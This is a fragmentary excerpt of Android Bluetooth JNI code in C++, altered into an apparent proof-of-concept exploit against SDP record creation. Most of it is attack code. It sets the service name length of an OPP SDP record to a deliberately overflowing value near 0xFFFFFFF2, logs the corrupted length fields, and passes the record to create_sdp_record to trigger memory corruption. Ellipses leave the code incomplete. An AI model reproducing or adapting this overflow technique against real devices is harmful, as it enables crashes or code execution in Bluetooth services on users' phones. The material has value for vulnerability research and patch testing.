...
static jint sdpCreateOppOpsRecordNative(JNIEnv* env, jobject obj,
  ...
  bluetooth_sdp_record record = {};  // Must be zero initialized
  ALOGI("=====bluetooth_sdp_record size: %zu or %#016lx", sizeof(bluetooth_sdp_record), 
        (unsigned long)sizeof(bluetooth_sdp_record));
  record.ops.hdr.type = SDP_TYPE_OPP_SERVER;
  size_t overflow_len = 0xFFFFFFF2 - sizeof(bluetooth_sdp_record) - 1;
  //int o_service_name_len = overflow_len >> 24;
  //int i = 0;
  const char* service_name = NULL;
  if (name_str != NULL) {
    service_name = env->GetStringUTFChars(name_str, NULL);
    ALOGI("=====name_str: %s" , service_name);
  ...
  ALOGI("=====SDP Create record with original service name: %s", service_name);
  record.ops.hdr.service_name_length = overflow_len;
  // ALOGI("=====SDP Create record with modified service name length : %zu", strlen(o_service_name));
  ALOGI("=====record.ops.hdr.service_name_length: %u or %#08x", record.ops.hdr.service_name_length,
         record.ops.hdr.service_name_length);
  ALOGI("=====record.hdr.service_name_length: %u or %#08x", record.hdr.service_name_length,
  ...
  int handle = -1;
  ALOGI("=====Goint to call create_sdp_record");
  int ret = sBluetoothSdpInterface->create_sdp_record(&record, &handle);
  if (ret != BT_STATUS_SUCCESS) {
    ALOGE("=====SDP Create record failed: %d", ret);
  } else {
